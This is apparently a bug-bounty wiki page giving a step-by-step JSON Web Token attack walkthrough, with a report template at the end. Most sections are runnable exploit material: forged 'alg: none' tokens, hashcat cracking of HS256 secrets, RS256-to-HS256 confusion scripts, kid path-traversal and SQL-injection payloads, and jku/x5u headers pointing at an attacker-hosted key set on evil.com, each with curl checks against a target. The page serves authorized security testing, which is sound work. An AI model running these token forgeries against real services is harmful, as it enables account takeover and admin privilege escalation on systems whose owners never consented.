---
type: wiki
category: attack
tool: jwt
status: active
last-updated: 2026-04-21
---

# JWT Attack Walkthrough

> **Purpose:** JWT is the primary session token for modern SPAs; common implementation mistakes can reach P1 ATO.
> This walks through anatomy → every implementation flaw → real-world PoC, start to finish.

## 0. Anatomy

```
header.payload.signature

# header example
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
→ {"alg":"HS256","typ":"JWT"}

# payload example
eyJzdWIiOiIxMjM0IiwibmFtZSI6IkpvaG4iLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTczNjAwMDAwMH0
→ {"sub":"1234","name":"John","admin":false,"exp":1736000000}

# signature = HMAC_SHA256(base64(header) + "." + base64(payload), secret)
```

### Quick decoding tools

```bash
# CLI
echo "eyJhbGciOi..." | cut -d. -f1 | base64 -d 2>/dev/null | jq
echo "eyJhbGciOi..." | cut -d. -f2 | base64 -d 2>/dev/null | jq

# Install jwt-cli (more convenient)
brew install mike-engel/jwt-cli/jwt-cli
jwt decode "eyJhbGciOi..."

# Or use jq + handle base64url padding
decode() { echo "$1" | sed 's/-/+/g;s/_/\//g' | base64 -d 2>/dev/null | jq; }
decode $(echo $TOKEN | cut -d. -f2)
```

### Essential tools to install

```bash
# jwt_tool — the ultimate Swiss army knife
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt
alias jwt_tool='python3 ~/Tools/jwt_tool/jwt_tool.py'

# hashcat — brute-force the HS256 secret
brew install hashcat

# jwtxpl (an alternative)
git clone https://github.com/DontPanicO/jwtXploiter
pip3 install -e ./jwtXploiter
```

## 1. `alg: none` (P1 if vulnerable)

### Principle
Some libraries accept `"alg":"none"` and pass validation with an empty signature.

### PoC

```bash
TOKEN="eyJhbGciOi..."

# Manual
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"1","admin":true}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED="${HEADER}.${PAYLOAD}."   # note the trailing .

# jwt_tool automated
jwt_tool $TOKEN -X a
```

### Verification

```bash
curl -sk https://target.com/api/me -H "Authorization: Bearer $FORGED"
# If it returns 200 + admin:true → P1 auth bypass
```

### Common variants (case bypass)

```
"alg":"None"
"alg":"NONE"
"alg":"nOnE"
"alg":""
```

## 2. Weak HS256 secret brute-forcing

### Principle
HS256 is symmetric; a weak secret can be brute-forced offline.

### PoC (hashcat)

```bash
# Write the full token to a file
echo "eyJhbGciOiJI...fullToken" > jwt.txt

# mode 16500 = JWT HS256
hashcat -m 16500 jwt.txt rockyou.txt

# Common secret wordlist (try this first)
hashcat -m 16500 jwt.txt /opt/wordlists/jwt.secrets.list

# Custom rules
hashcat -m 16500 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Common terrible secrets

```
secret
your-256-bit-secret
jwt_secret
supersecret
password
admin
changeme
default
test
my-secret-key
```

Or use **jwt-wordlist** (a purpose-built collection): https://github.com/wallarm/jwt-secrets

### Forging a token after a successful brute

```bash
jwt_tool $TOKEN -S hs256 -p "secret123"
# or
jwt_tool $TOKEN -X k -pk "secret123"
```

## 3. Algorithm confusion (RS256 → HS256)

### Principle
The server calls `verify(token, publicKey)` without checking `alg`.
The attacker changes the header to HS256, signing with the **public key used as the HMAC secret**.

### Obtaining the public key

```bash
# Method A: JWK endpoint
curl -s https://target.com/.well-known/jwks.json | jq

# Method B: OpenID config
curl -s https://target.com/.well-known/openid-configuration | jq .jwks_uri

# Method C: TLS cert (in rare cases the key is shared)
openssl s_client -connect target.com:443 -showcerts < /dev/null | \
  openssl x509 -pubkey -noout
```

### PoC

```bash
# jwt_tool automated
jwt_tool $TOKEN -X k -pk public.pem

# Or manually (python)
python3 << 'EOF'
import jwt
with open('public.pem') as f:
    public_key = f.read()
# Key trick: pass the public key as the HS256 secret
forged = jwt.encode(
    {"sub":"1","admin":True},
    public_key,
    algorithm="HS256"
)
print(forged)
EOF
```

### Verification

```bash
curl -sk https://target.com/api/me -H "Authorization: Bearer $FORGED"
```

## 4. `kid` header injection

### Principle
`kid` (key ID) is used for key lookup. If the implementation doesn't sanitize it, this can lead to:
- Path traversal: `kid: "../../../../dev/null"` → the server reads an empty file as the key → you can sign with an empty string
- SQL injection: `kid: "' UNION SELECT 'x"` → the server returns `x` as the key

### PoC (kid LFI → null key)

```bash
# jwt_tool automated
jwt_tool $TOKEN -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""

# Or manually
HEADER='{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}'
# Then sign with an empty secret
```

### PoC (kid SQL injection)

```
"kid":"a' UNION SELECT 'AAAAA"
```
→ the server queries the DB with `SELECT key FROM keys WHERE id='a' UNION SELECT 'AAAAA'`
→ returns `AAAAA` as the HMAC key
→ the attacker signs using `AAAAA`

```bash
jwt_tool $TOKEN -I -hc kid -hv "x' UNION SELECT 'ExpectedKey" -S hs256 -p "ExpectedKey"
```

## 5. `jku` / `x5u` injection

### Principle
`jku` = JSON Web Key Set URL (tells the server where to fetch the public key).
If the server doesn't validate the jku domain → the attacker hosts their own JWK set → and signs with their own private key.

### PoC

```bash
# Step 1: generate a keypair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Step 2: convert the public key into JWK format
python3 << 'EOF'
from jwcrypto import jwk
with open('public.pem','rb') as f:
    key = jwk.JWK.from_pem(f.read())
    key_data = key.export_public(as_dict=True)
    key_data['kid'] = 'attacker-key'
print({"keys":[key_data]})
EOF
# Host the JWKS on your own server: https://evil.com/jwks.json

# Step 3: forge the token
python3 << 'EOF'
import jwt
with open('private.pem') as f:
    priv = f.read()
token = jwt.encode(
    {"sub":"1","admin":True},
    priv,
    algorithm="RS256",
    headers={"jku":"https://evil.com/jwks.json","kid":"attacker-key"}
)
print(token)
EOF
```

### jku bypass variants

```
"jku":"https://target.com@evil.com/jwks.json"
"jku":"https://target.com.evil.com/jwks.json"
"jku":"https://evil.com/jwks.json#target.com"
"jku":"https://target.com/../../../evil.com/jwks.json"
```

## 6. `x5c` / `x5u` embedded certificate

Similar to jku, but the cert is embedded directly in the header (x5c) or fetched from a URL (x5u). If the server trusts the cert embedded in the header, an attacker can self-sign a cert and forge tokens.

```bash
jwt_tool $TOKEN -X s -I -hc x5c -hv "<base64 cert>"
```

## 7. Token never expires / never revoked

### Testing

```bash
# Does the original token still work after logout?
curl -X POST https://target.com/logout -H "Authorization: Bearer $TOKEN"
curl https://target.com/api/me -H "Authorization: Bearer $TOKEN"
# If it still returns 200 → logout doesn't work (session not blacklisted) → P3

# Does the old token still work after a password change?
# Change password → use the old token
curl https://target.com/api/me -H "Authorization: Bearer $OLD_TOKEN"
# If it returns 200 → password changes don't revoke tokens → P2
```

### Long-lived tokens

```
# Check how long until exp
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .exp
# If exp is more than 1 year out → risk
# If there's no exp at all → P3 (the spec requires one)
```

## 8. Information disclosure in the payload

```bash
# Decode the payload and check for:
# - password / password_hash
# - internal user ID
# - API key
# - email
# - role / permission map

echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq
```

Common leaks:

```json
{
  "sub":"u_123",
  "email":"admin@target.com",
  "role":"admin",
  "permissions":["*"],
  "db_user":"root",      // leaked
  "internal_id":"42",    // leaked
  "avatar":"s3://private-bucket/..." // leaked
}
```

## 9. Signature verification bypassed (common library bugs)

### PyJWT <1.5.0: alg not enforced

```python
# vulnerable
jwt.decode(token, public_key)   # algorithms= not passed

# an attacker sends HS256 signed with the public_key as the secret → passes
```

### jsonwebtoken (Node) <4.0: same issue

### golang-jwt: alg confusion requires explicit rejection

### Testing tip
If the app's library version is outdated (leaked via package.json / go.sum), always try alg confusion + none.

## 10. Full real-world attack chain (example)

Assumed target:
- JWT HS256
- header has `kid`
- login gives you a low-privilege token

### Step 1: Determine alg

```bash
jwt decode $TOKEN
# "alg":"HS256"
```

### Step 2: Try alg=none

```bash
jwt_tool $TOKEN -X a
# Fails → the library has protection
```

### Step 3: Brute-force the HS256 secret

```bash
echo $TOKEN > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt
# If cracked → forge an admin token using the cracked secret
```

### Step 4: kid injection

```bash
# If kid is a filename-style value
jwt_tool $TOKEN -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# If kid is a DB query
jwt_tool $TOKEN -I -hc kid -hv "x'||CHR(65)||CHR(65)||CHR(65)||CHR(65)||'" -S hs256 -p "AAAA"
```

### Step 5: Payload tampering

```bash
# Change user_id / role
jwt_tool $TOKEN -T
# Interactive editing, then re-sign
```

## 11. bbflow integration

```bash
# The hunt-jwt hunter automatically checks for:
# - alg none
# - weak HS256 (built-in small wordlist)
# - long expiry
# - sensitive data leaks
bbflow hunt target.com --only jwt

# Deeper: full jwt_tool scan
jwt_tool $TOKEN -M at
# -M at = all tests
```

## 12. jwt_tool command quick reference

```bash
# Decode
jwt_tool $TOKEN

# All automated tests
jwt_tool $TOKEN -M at

# Test alg confusion
jwt_tool $TOKEN -X k -pk public.pem

# Tamper with the payload
jwt_tool $TOKEN -T

# Brute-force HS256
jwt_tool $TOKEN -C -d secrets.txt

# Set alg=none
jwt_tool $TOKEN -X a

# kid injection
jwt_tool $TOKEN -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# jku injection
jwt_tool $TOKEN -X s -I -hc jku -hv "https://evil.com/jwks.json"
```

## 13. Report template

```markdown
## Vulnerability Overview
https://api.target.com uses JWT HS256 for session auth, with the secret set to `changeme` (crackable via wordlist).
An attacker can crack the secret and forge arbitrary user tokens, achieving account takeover.

## Reproduction Steps

### Step 1: Log in to obtain a legitimate token
curl -X POST https://api.target.com/login \
  -d '{"email":"attacker@x.com","password":"xxx"}'
# → token: eyJhbGciOiJIUzI1NiIs...

### Step 2: Analyze the token
jwt decode $TOKEN
# alg: HS256
# payload: {"sub":"u_attacker","role":"user","exp":..}

### Step 3: Brute-force the secret
echo $TOKEN > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt
# → cracked in 15 seconds: "changeme"

### Step 4: Forge an admin token
jwt_tool $TOKEN -S hs256 -p "changeme" -T
# Change sub:"u_admin", role:"admin"

### Step 5: Verify
curl https://api.target.com/admin/users \
  -H "Authorization: Bearer $FORGED"
# → 200, returns the full user list

## Impact
- Arbitrary user ATO
- Unauthenticated privilege escalation to admin
- Full-site user data readable (PII)

## Severity
P1 / Critical
```

## Related documents

- [../hunters/hunt-jwt.sh](../hunters/hunt-jwt.sh)
- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 10-11 JWT section
- PortSwigger JWT Labs: https://portswigger.net/web-security/jwt
- jwt_tool Wiki: https://github.com/ticarpi/jwt_tool/wiki
